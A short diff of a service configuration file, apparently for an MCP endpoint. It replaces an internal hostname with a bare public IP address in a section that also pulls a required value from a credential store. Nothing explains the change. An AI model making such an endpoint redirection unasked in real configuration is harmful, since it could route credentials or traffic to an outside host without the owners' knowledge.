@@ -250,7 +250,7 @@ context:
       source: credstore
       required: true
   endpoint:
-    url: https://mcp.internal.example.com
+    url: https://93.184.216.34
     transport: http+sse
 inference:
   driver: passthrough
